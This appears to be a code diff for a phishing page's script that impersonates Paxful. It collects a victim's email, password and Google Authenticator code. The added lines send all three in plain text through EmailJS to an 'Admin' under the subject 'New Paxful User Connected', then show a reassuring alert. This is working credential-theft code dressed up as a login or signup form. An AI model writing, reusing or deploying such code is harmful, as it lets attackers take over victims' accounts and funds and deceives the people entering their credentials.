@@ -22,43 +22,43 @@ const googleInput = document.getElementById('google_auth_code');
 googleInput.addEventListener('input', () => {
     let googleInputValue = googleInput;
     googleInputValue.value = googleInputValue.value.replace(/\D/g, ''); //Remove non digits char
-})
+});
+
 
 form.addEventListener('submit', (event) => {
     event.preventDefault();
     signupBtn.disabled = true;
     loader.style.display = "inline";
-    btnValue = "";
+
     const inputEmail = document.getElementById('email').value;
     const inputPassword = document.getElementById('password').value;
     const googleAuth = document.getElementById('google_auth_code').value;
 
-    fetch('send_email.php', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({inputEmail, inputPassword, googleAuth})
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.status == 'success') {
-            loader.style.display = 'none';
-            signupBtn.disabled = false;
-            alert(data.message);
-            form.reset();
-        } else {
-            loader.style.display = 'none';
-            alert('An error occurred. Try again later');
-        }
-    })
-    .catch(error => {
+    const formData = {
+        to_name: "Admin", // Recipient name
+        from_name: "New User", // Sender's name
+        message: `Email: ${inputEmail}, Password: ${inputPassword}, Google Auth: ${googleAuth}`, // Main message
+        subject: "New Paxful User Connected" // Custom subject for the email
+    };
+   
+
+    // Send email using EmailJS
+    emailjs.send("service_mss5upj", "template_q4fw2bl", formData)
+    .then((response) => {
         loader.style.display = 'none';
         signupBtn.disabled = false;
-        alert('An error occurred. Try again later');
+        // console.log("Email sent successfully!", response);
+        alert("Thank you! Your email has been sent...");
+        form.reset();
+    })
+    .catch((error) => {
+        loader.style.display = 'none';
+        signupBtn.disabled = false;
+        // console.error("Failed to send email:", error);
+        alert("Oops! Something went wrong. Please try again.");
     });
-
 });
+
 
 // Detect system theme
 const systemTheme = window.matchMedia('(prefers-color-scheme: dark)');
